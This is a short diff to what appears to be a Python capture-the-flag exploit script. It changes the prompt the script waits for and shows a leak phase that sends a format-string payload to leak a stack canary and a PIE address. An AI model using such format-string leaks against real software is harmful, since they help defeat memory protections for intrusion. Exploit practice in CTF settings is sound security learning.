@@ -29,7 +29,7 @@ def conn():
 def main():
     # ── leak phase ────────────────────────────────────────────────────────────
     r = conn()
-    r.recvuntil(b'name')
+    r.recvuntil(b'astronaut ID: ')
     r.sendline(f'%{CANARY_IDX}$lx.%{PIE_IDX}$lx'.encode())
 
     response = r.recvline()
